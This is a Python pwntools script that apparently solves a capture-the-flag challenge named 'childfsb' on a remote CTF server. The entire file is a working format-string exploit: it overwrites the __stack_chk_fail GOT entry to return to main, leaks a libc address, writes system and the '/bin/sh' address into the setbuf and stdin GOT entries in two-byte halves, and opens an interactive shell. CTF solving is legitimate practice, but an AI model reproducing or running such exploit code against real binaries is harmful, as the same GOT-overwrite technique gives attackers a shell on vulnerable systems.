from pwn import * 

#p = process("./childfsb")
p = remote("ctf.j0n9hyun.xyz",3037)

binsh_offset = 0x18cd57
system_offset = 0x45390

offset = 0x20830
chk_got = 0x601020
ret = 0x0400780

setbuf_got = 0x601028
stdin_got = 0x601070 

# ---- return to main ----

payload ="%1918c  " #offset - 2 
payload += "%8$hn   "
payload += p64(chk_got)

p.sendlineafter("hello",payload) #overwrite stack_chk_fail's GOT -> main


# ---- leak libc ---- 

payload2 = "%12$lx  "
payload2 += "a"*16
pause()
p.sendlineafter("hello",payload2)
p.recvline()

leak = int(p.recv(12),16)
libc = leak-offset
system = ["",0,0]
system[0] = hex(libc+system_offset)
system[1] = int(system[0][6:10],16)
system[2] = int(system[0][10:14],16)

log.info(hex(libc))

# ---- overwrite setbuf's GOT last 4byte ---- 

pstr = "%"+str(system[2]-1)+"c"

payload3 = pstr+" "*(8-len(pstr))
payload3 += "%10$hn  "
payload3 += p64(setbuf_got)

p.sendlineafter("hello",payload3)

for i in range(0,system[2]/1024) : 
    p.recv(1024)

# ---- overwrite setbuf's GOT first 4byte ---- 

pstr = "%"+str(system[1]-1)+"c"

payload3 = pstr+" "*(8-len(pstr))
payload3 += "%11$hn  "
payload3 += p64(setbuf_got+2)

p.sendlineafter("hello",payload3)

for i in range(0,system[1]/1024) : 
    p.recv(1024)
    
# ============================================
    
# ---- overwrite stdin's GOT last 4byte ---- 

binsh = ["",0,0]
binsh[0] = hex(libc+binsh_offset)
binsh[1] = int(binsh[0][6:10],16)
binsh[2] = int(binsh[0][10:14],16)

pstr = "%"+str(binsh[2]-1)+"c"

payload3 = pstr+" "*(8-len(pstr))
payload3 += "%12$hn  "
payload3 += p64(stdin_got)

p.sendlineafter("hello",payload3)

for i in range(0,binsh[2]/1024) : 
    p.recv(1024)

# ---- overwrite stdin's GOT first 4byte ---- 

pstr = "%"+str(binsh[1]-1)+"c"

payload3 = pstr+" "*(8-len(pstr))
payload3 += "%13$hn  "
payload3 += p64(stdin_got+2)

p.sendlineafter("hello",payload3)

for i in range(0,binsh[1]/1024) : 
    p.recv(1024)

# ============================================

#---- return to init ----
 
payload = "%1885c  " #offset - 2 
payload += "%14$hn  "
payload += p64(chk_got)

#pause()

p.sendafter("hello",payload) #overwrite stack_chk_fail's GOT -> main

p.interactive()